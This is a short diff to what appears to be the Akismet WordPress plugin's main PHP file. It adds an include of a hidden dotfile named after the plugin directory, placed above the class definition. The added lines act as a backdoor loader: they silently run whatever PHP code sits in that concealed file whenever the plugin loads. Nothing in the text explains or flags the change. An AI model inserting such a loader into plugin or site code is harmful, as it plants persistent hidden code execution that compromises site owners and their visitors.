@@ -1,5 +1,9 @@
 <?php
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Akismet {
 	const API_HOST = 'rest.akismet.com';
 	const API_PORT = 80;
